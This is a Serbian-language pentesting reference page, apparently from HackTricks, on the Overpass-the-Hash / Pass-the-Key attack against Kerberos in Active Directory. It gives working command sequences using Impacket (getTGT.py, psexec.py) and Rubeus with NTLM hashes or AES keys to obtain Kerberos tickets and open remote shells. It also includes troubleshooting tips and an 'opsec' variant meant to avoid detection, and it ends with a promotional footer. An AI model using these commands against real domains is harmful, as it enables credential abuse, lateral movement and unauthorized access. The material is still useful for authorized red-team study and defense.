# Over Pass the Hash/Pass the Key

Napad **Pređi preko heša/Pređi ključem (PTK)** je dizajniran za okruženja u kojima je tradicionalni NTLM protokol ograničen, a Kerberos autentifikacija ima prednost. Ovaj napad koristi NTLM heš ili AES ključeve korisnika kako bi dobio Kerberos tikete, omogućavajući neovlašćeni pristup resursima unutar mreže.

Da bi se izveo ovaj napad, prvi korak je dobijanje NTLM heša ili lozinke ciljanog korisničkog naloga. Nakon što se ova informacija obezbedi, može se dobiti Ticket Granting Ticket (TGT) za taj nalog, što omogućava napadaču pristup uslugama ili mašinama za koje korisnik ima dozvole.

Proces se može pokrenuti sledećim komandama:

```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

Za scenarije koji zahtevaju AES256, može se koristiti opcija `-aesKey [AES ključ]`. Osim toga, dobijeni tiket može se koristiti sa različitim alatima, uključujući smbexec.py ili wmiexec.py, proširujući opseg napada.

Naiđeni problemi kao što su _PyAsn1Error_ ili _KDC ne može pronaći ime_ obično se rešavaju ažuriranjem Impacket biblioteke ili korišćenjem imena hosta umesto IP adrese, kako bi se osigurala kompatibilnost sa Kerberos KDC.

Alternativni niz komandi koji koristi Rubeus.exe prikazuje drugu stranu ove tehnike:

```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

Ova metoda oponaša pristup **Pass the Key**, sa fokusom na preuzimanju i korišćenju tiketa direktno u svrhu autentifikacije. Važno je napomenuti da pokretanje zahteva za TGT izaziva događaj `4768: Zahtevan je Kerberos autentifikacioni tiket (TGT)`, što ukazuje na podrazumevano korišćenje RC4-HMAC, iako moderni Windows sistemi preferiraju AES256.

Da bi se pridržavali operativne bezbednosti i koristili AES256, može se primeniti sledeća komanda:

```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```

## Reference

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
